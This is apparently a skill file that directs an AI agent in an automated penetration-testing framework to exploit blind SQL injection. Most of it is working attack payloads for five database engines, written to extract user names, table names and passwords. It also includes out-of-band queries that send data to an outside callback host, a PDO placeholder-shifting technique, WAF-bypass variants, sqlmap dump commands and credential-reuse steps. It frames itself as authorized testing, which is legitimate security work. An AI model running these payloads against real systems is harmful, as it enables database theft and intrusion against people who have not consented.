---
name: sql-injection-blind
description: >
  Guide blind SQL injection exploitation (boolean-based, time-based, and
  out-of-band) during authorized penetration testing.
keywords:
  - blind SQLi
  - boolean-based
  - time-based
  - SLEEP injection
  - WAITFOR DELAY
  - pg_sleep
  - no output visible
  - no errors shown
  - inferential SQLi
  - OOB SQL injection
  - DNS exfiltration SQL
tools:
  - sqlmap
  - burpsuite
opsec: medium
---

# Blind SQL Injection

You are helping a penetration tester exploit blind SQL injection. The target
application does not display query results or error messages, so data must be
extracted indirectly — through boolean conditions, time delays, or out-of-band
channels. All testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[sql-injection-blind] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Confirmed SQL injection point (see **web-discovery**)
- No query output rendered in the response (otherwise use **sql-injection-union**)
- No verbose errors displayed (otherwise use **sql-injection-error**)
- For boolean: a detectable difference between true and false conditions
- For time-based: stable enough network to detect deliberate delays

## Step 1: Assess

If not already provided by the orchestrator or conversation context, determine:
1. **Injection point** — URL, parameter name, request method
2. **Response behavior** — how does the app respond to valid vs invalid input?
3. **DBMS** — if known from other testing

Skip if context was already provided.

## Step 2: Confirm Blind Technique

### Boolean-Based

Inject conditions that produce different responses:
```sql
' AND 1=1--+    -- TRUE — page renders normally
' AND 1=2--+    -- FALSE — page changes (missing content, error, redirect)
```
Compare: response body, Content-Length, status code, specific elements.

### Time-Based

Inject a sleep function and measure response delay:
```sql
' AND SLEEP(5)--+                                          -- MySQL
'; WAITFOR DELAY '0:0:5'--+                                -- MSSQL
' AND 1=(SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)--+ -- PostgreSQL
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--+                -- Oracle
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--+ -- SQLite
```

## Step 3: Extract Data — Boolean-Based

Pattern: ask "is the Nth character of [data] equal to X?" via binary search.

### MySQL

```sql
-- Check length first
' AND LENGTH(user())=N--+

-- Binary search character extraction
' AND ASCII(SUBSTRING(user(),1,1))>78--+     -- Is char > 'N'?
' AND ASCII(SUBSTRING(user(),1,1))>90--+     -- Is char > 'Z'?
' AND ASCII(SUBSTRING(user(),1,1))=114--+    -- Is char 'r'?

-- Extract database name
' AND ASCII(SUBSTRING(database(),1,1))>78--+

-- Count tables
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=N--+

-- Extract table name char by char
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>78--+

-- Extract column name
' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='TARGET_TABLE' LIMIT 0,1),1,1))>78--+

-- Extract data
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>78--+
```

**Alternatives** when ASCII/SUBSTRING are blocked:
```sql
' AND (SELECT user()) LIKE 'r%'--+     -- LIKE
' AND (SELECT user()) REGEXP '^r'--+   -- REGEXP
' AND MID(user(),1,1)='r'--+           -- MID (alias for SUBSTRING)
```

### MSSQL

```sql
' AND ASCII(SUBSTRING(SYSTEM_USER,1,1))>78--+
' AND ASCII(SUBSTRING(DB_NAME(),1,1))>78--+
' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM master..sysdatabases WHERE name NOT IN (SELECT TOP 0 name FROM master..sysdatabases)),1,1))>78--+
' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1))>78--+
' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>78--+
```

### PostgreSQL

```sql
' AND ASCII(SUBSTRING(current_user,1,1))>78--+
' AND ASCII(SUBSTRING(current_database(),1,1))>78--+
' AND ASCII(SUBSTRING((SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 1),1,1))>78--+
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>78--+
```

### Oracle

```sql
-- Oracle uses SUBSTR instead of SUBSTRING
' AND ASCII(SUBSTR((SELECT user FROM dual),1,1))>78--+
' AND ASCII(SUBSTR((SELECT table_name FROM user_tables WHERE ROWNUM=1),1,1))>78--+
' AND ASCII(SUBSTR((SELECT password FROM users WHERE ROWNUM=1),1,1))>78--+
```

### SQLite

```sql
' AND UNICODE(SUBSTR(sqlite_version(),1,1))>50--+
' AND UNICODE(SUBSTR((SELECT tbl_name FROM sqlite_master WHERE type='table' LIMIT 1),1,1))>78--+
' AND UNICODE(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>78--+
```

## Step 4: Extract Data — Time-Based

Same character-by-character approach, using response delay instead of content differences.

### MySQL

```sql
' AND IF(ASCII(SUBSTRING(user(),1,1))>78,SLEEP(2),0)--+
' AND IF(ASCII(SUBSTRING(database(),1,1))>78,SLEEP(2),0)--+
' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>78,SLEEP(2),0)--+
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>78,SLEEP(2),0)--+
```

**BENCHMARK** alternative:
```sql
' AND IF(ASCII(SUBSTRING(user(),1,1))>78,BENCHMARK(10000000,SHA1('test')),0)--+
```

### MSSQL

```sql
'; IF(ASCII(SUBSTRING(DB_NAME(),1,1))>78) WAITFOR DELAY '0:0:2'--+
'; IF (SELECT ASCII(SUBSTRING(SYSTEM_USER,1,1)))>78 WAITFOR DELAY '0:0:2'--+
```

### PostgreSQL

```sql
' AND 1=(SELECT CASE WHEN ASCII(SUBSTRING(current_user,1,1))>78 THEN pg_sleep(2) ELSE pg_sleep(0) END)--+
' AND 1=(SELECT CASE WHEN ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>78 THEN pg_sleep(2) ELSE pg_sleep(0) END)--+
```

### Oracle

```sql
' AND 1=(SELECT CASE WHEN ASCII(SUBSTR(user,1,1))>78 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',2) ELSE 0 END FROM dual)--+
```

## Step 5: Extract Data — Out-of-Band (OOB)

When neither boolean nor time-based is reliable, exfiltrate via DNS or HTTP callbacks. Requires external infrastructure (Burp Collaborator, interactsh, or custom DNS).

### MySQL (requires FILE privilege)
```sql
' AND LOAD_FILE(CONCAT('\\\\',user(),'.COLLABORATOR.oastify.com\\share'))--+
```

### MSSQL
```sql
'; EXEC master..xp_dirtree '\\'+SYSTEM_USER+'.COLLABORATOR.oastify.com\share'--+
```

### PostgreSQL
```sql
'; COPY (SELECT current_user) TO PROGRAM 'nslookup '||current_user||'.COLLABORATOR.oastify.com'--+
```

### Oracle
```sql
' AND 1=UTL_HTTP.REQUEST('http://'||(SELECT user FROM dual)||'.COLLABORATOR.oastify.com/')--+
```

## Step 6: PDO Emulated Prepares — Identifier-Position Injection

When the injection point is in an **identifier position** (column name, table
name, ORDER BY target) and the application uses PHP PDO with emulated prepares
(the default), standard blind SQLi techniques may not apply. PDO's query parser
does not understand backtick-quoted identifiers, creating exploitable
mismatches between what PDO considers a placeholder and what MySQL executes.

### Detection

Signs that you're dealing with identifier-position injection:
- User input controls a column name, sort field, or table name
- The application wraps the value in backticks: `` `user_input` ``
- Standard `' OR 1=1--` payloads have no effect (not in a string context)
- sqlmap returns "parameter does not appear to be injectable"
- Source code shows PDO `prepare()` with variable interpolation in identifier
  positions (not in WHERE value positions)

### PDO Parser Mismatch

PDO's emulated prepare mode (default when `ATTR_EMULATE_PREPARES` is not
explicitly set to `false`) performs client-side placeholder substitution. The
parser scans the query string for `?` markers, but does **not** understand
MySQL's backtick quoting context. This means:

- `` SELECT `?` FROM t WHERE id = ? `` — PDO sees TWO placeholders
- MySQL sees ONE placeholder (the backtick-wrapped `?` is an identifier literal)
- If the application binds N values but PDO counts N+1 placeholders, the bound
  values **shift** — a value intended for a WHERE clause may land in the SELECT
  column list or vice versa

### Exploitation Pattern

When user input controls an identifier that gets backtick-wrapped, and a
subsequent bound parameter (e.g., `user_id`) contains user-controlled data:

1. **Inject a `?` inside the identifier** — use `\?` or other forms that
   survive input sanitization but produce a literal `?` after backtick stripping
2. **Comment out the original placeholder** — `-- ` after the identifier
   silences the real `?` in the WHERE clause
3. **The next bound value shifts** into the identifier position — if that
   value is user-controlled (e.g., via IDOR on a `user_id` parameter), it
   becomes a SQL injection point in the SELECT column list

### MySQL Identifier Context

Once a value is shifted into the column position of a SELECT query:
- Subqueries work: `(SELECT password FROM users LIMIT 1)` returns data as
  the column value
- `SLEEP()` works for time-based confirmation
- UPDATE via stacked queries (if PDO uses `PDO::MYSQL_ATTR_MULTI_STATEMENTS`
  or the driver allows it)

### Key Indicators to Report

If you suspect this class of vulnerability, report to the orchestrator:
- PDO usage with emulated prepares (default or explicit)
- Identifier-position user input with backtick wrapping
- Presence of user-controlled bound parameters that could shift
- Whether stacked queries are available

This is a niche technique — if standard blind SQLi fails on a PHP/PDO target
with identifier-position input, escalate to `unknown-vector-analysis` with
these details for deep analysis.

## Step 7: Post-Exploitation

After extracting credentials or key data:
1. **Escalate technique** — if found higher-privilege DB creds, try **sql-injection-union** or **sql-injection-stacked**
2. **File operations** — check read/write capabilities for the confirmed DBMS
3. **Command execution** — route to **sql-injection-stacked**
4. **Credential reuse** — test against SSH, RDP, admin panels

## Step 8: Escalate or Pivot

STOP and return to the orchestrator with:
- What was achieved (RCE, creds, file read, etc.)
- New credentials, access, or pivot paths discovered
- Context for next steps (platform, access method, working payloads)

## OPSEC Notes

- Blind SQLi is read-only — no database artifacts
- Boolean-based generates high request volume (detectable by rate monitors)
- Time-based queries appear in slow query logs
- OOB creates DNS queries to unusual subdomains (detectable by DNS monitoring)
- Defenders look for: `SLEEP`, `WAITFOR`, `pg_sleep`, `BENCHMARK`, `ASCII`, `SUBSTRING` patterns

## Troubleshooting

### Boolean Responses Are Inconsistent
- Application may have dynamic content. Find a stable indicator:
  - Specific HTML element present only on "true"
  - Exact response size threshold
  - Specific keyword in response
- In Burp Intruder, use "Grep - Match" to flag a specific string

### Time-Based Is Unreliable
- Increase delay: `SLEEP(5)` instead of `SLEEP(2)`
- Use multiple samples per character and take the median
- Switch to boolean-based if any detectable content difference exists
- Consider OOB if callback infrastructure is available

### WAF Blocking SLEEP/BENCHMARK
```sql
-- MySQL: heavy query instead of SLEEP
' AND IF(1=1,(SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C),0)--+

-- MSSQL: stacked WAITFOR
' AND 1=1 WAITFOR DELAY '0:0:5'--+
```

### Filter Bypass — Blocked Keywords
```sql
MID(str,pos,len)           -- MySQL (alias for SUBSTRING)
SUBSTR(str,pos,len)        -- All DBs
RIGHT(LEFT(str,pos),1)     -- Most DBs
```

### Automated Extraction with sqlmap
```bash
# Boolean-based only
sqlmap -u "https://TARGET/page?id=1" --batch --technique=B --dbs

# Time-based only
sqlmap -u "https://TARGET/page?id=1" --batch --technique=T --dbs

# Both blind techniques
sqlmap -u "https://TARGET/page?id=1" --batch --technique=BT --dbs

# Increase time-based delay for unreliable networks
sqlmap -u "https://TARGET/page?id=1" --batch --technique=T --time-sec=5 --dbs

# Increase threads for faster boolean extraction
sqlmap -u "https://TARGET/page?id=1" --batch --technique=B --threads=8 --dbs

# From Burp request file
sqlmap -r request.txt --batch --technique=BT -p "id" --dbs

# Dump data
sqlmap -r request.txt --batch --technique=BT -D TARGET_DB -T TARGET_TABLE --dump
```
